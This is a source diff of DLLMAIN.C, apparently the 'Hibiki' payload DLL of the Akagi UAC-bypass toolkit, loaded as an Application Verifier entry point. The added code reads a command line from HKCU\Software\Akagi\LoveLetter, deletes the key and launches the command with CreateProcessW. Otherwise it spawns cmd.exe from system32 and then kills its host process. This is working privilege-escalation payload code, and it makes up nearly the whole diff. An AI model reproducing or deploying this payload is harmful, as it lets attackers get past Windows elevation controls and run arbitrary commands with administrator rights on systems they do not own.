@@ -4,11 +4,11 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     1.81
+*  VERSION:     1.90
 *
-*  DATE:        11 Aug 2015
+*  DATE:        17 Sept 2015
 *
-*  AVrf entry point.
+*  AVrf entry point, Hibiki Kai Ni.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -27,6 +27,19 @@
 #include <ntstatus.h>
 #include "..\shared\ntos.h"
 #include "..\shared\minirtl.h"
+
+
+#if (_MSC_VER >= 1900) 
+#ifdef _DEBUG
+#pragma comment(lib, "vcruntimed.lib")
+#pragma comment(lib, "ucrtd.lib")
+#else
+#pragma comment(lib, "libvcruntime.lib")
+#endif
+#endif
+
+#define T_AKAGI_KEY    L"\\Software\\Akagi"
+#define T_AKAGI_PARAM  L"LoveLetter"
 
 #define DLL_PROCESS_VERIFIER 4
 
@@ -240,6 +253,118 @@ DWORD ucmExpandEnvironmentStrings(
 }
 
 /*
+* ucmQueryCustomParameter
+*
+* Purpose:
+*
+* Query custom parameter and run it.
+*
+*/
+BOOL ucmQueryCustomParameter(
+	VOID
+	)
+{
+	BOOL                    cond = FALSE, bResult = FALSE;
+
+	OBJECT_ATTRIBUTES               obja;
+	UNICODE_STRING                  usKey;
+	NTSTATUS                        status;
+	KEY_VALUE_PARTIAL_INFORMATION	keyinfo;
+
+	SIZE_T                  memIO;
+	HKEY                    hKey = NULL;
+	PVOID                   ProcessHeap = NtCurrentPeb()->ProcessHeap;
+	LPWSTR                  lpData = NULL, lpParameter = NULL, lpszParamKey = NULL;
+	STARTUPINFOW            startupInfo;
+	PROCESS_INFORMATION     processInfo;
+	ULONG                   bytesIO = 0L;
+
+	do {
+
+		RtlSecureZeroMemory(&usKey, sizeof(usKey));
+		status = RtlFormatCurrentUserKeyPath(&usKey);
+		if (!NT_SUCCESS(status)) {
+			break;
+		}
+
+		memIO = (_strlen_w(T_AKAGI_KEY) * sizeof(WCHAR)) +
+			usKey.MaximumLength + sizeof(UNICODE_NULL);
+
+		lpszParamKey = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, memIO);
+		if (lpszParamKey == NULL) {
+			RtlFreeUnicodeString(&usKey);
+			break;
+		}
+
+		_strcpy_w(lpszParamKey, usKey.Buffer);
+		_strcat_w(lpszParamKey, T_AKAGI_KEY);
+		RtlFreeUnicodeString(&usKey);
+
+		RtlSecureZeroMemory(&usKey, sizeof(usKey));
+		RtlInitUnicodeString(&usKey, lpszParamKey);
+		InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+		status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
+		if (!NT_SUCCESS(status)) {
+			break;
+		}
+
+		RtlInitUnicodeString(&usKey, T_AKAGI_PARAM);
+		status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, &keyinfo,
+			sizeof(KEY_VALUE_PARTIAL_INFORMATION), &bytesIO);
+
+		if ((status != STATUS_SUCCESS) &&
+			(status != STATUS_BUFFER_TOO_SMALL) &&
+			(status != STATUS_BUFFER_OVERFLOW))
+		{
+			break;
+		}
+
+		lpData = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, bytesIO);
+		if (lpData == NULL) {
+			break;
+		}
+
+		status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, lpData, bytesIO, &bytesIO);
+		NtDeleteKey(hKey);
+		NtClose(hKey);
+		hKey = NULL;
+
+		lpParameter = (LPWSTR)((PKEY_VALUE_PARTIAL_INFORMATION)lpData)->Data;
+		if (lpParameter != NULL) {
+
+			DbgPrint("Akagi letter found: %ws", lpParameter);
+
+			RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
+			RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
+			startupInfo.cb = sizeof(startupInfo);
+			ucmGetStartupInfo(&startupInfo);
+
+			bResult = pCreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
+				NULL, &startupInfo, &processInfo);
+
+			if (bResult) {
+				NtClose(processInfo.hProcess);
+				NtClose(processInfo.hThread);
+			}
+		}
+
+		RtlFreeHeap(ProcessHeap, 0, lpData);
+
+	} while (cond);
+
+	if (hKey != NULL) {
+		NtDeleteKey(hKey);
+		NtClose(hKey);
+	}
+	if (lpszParamKey != NULL) {
+		RtlFreeHeap(ProcessHeap, 0, lpszParamKey);
+	}
+
+	return bResult;
+}
+
+/*
 * ucmbRunTarget
 *
 * Purpose:
@@ -260,23 +385,25 @@ VOID ucmbRunTarget(
 		return;
 	}
 
-	RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
-	RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
-	startupInfo.cb = sizeof(startupInfo);
-	ucmGetStartupInfo(&startupInfo);
+	if (!ucmQueryCustomParameter()) {
+		RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
+		RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
+		startupInfo.cb = sizeof(startupInfo);
+		ucmGetStartupInfo(&startupInfo);
 
-	RtlSecureZeroMemory(sysdir, sizeof(sysdir));
-	cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
-	if ((cch != 0) && (cch < MAX_PATH)) {
-		RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
-		_strcpy_w(cmdbuf, sysdir);
-		_strcat_w(cmdbuf, L"cmd.exe");
+		RtlSecureZeroMemory(sysdir, sizeof(sysdir));
+		cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
+		if ((cch != 0) && (cch < MAX_PATH)) {
+			RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
+			_strcpy_w(cmdbuf, sysdir);
+			_strcat_w(cmdbuf, L"cmd.exe");
 
-		if (pCreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
-			sysdir, &startupInfo, &processInfo))
-		{
-			NtClose(processInfo.hProcess);
-			NtClose(processInfo.hThread);
+			if (pCreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
+				sysdir, &startupInfo, &processInfo))
+			{
+				NtClose(processInfo.hProcess);
+				NtClose(processInfo.hThread);
+			}
 		}
 	}
 	NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
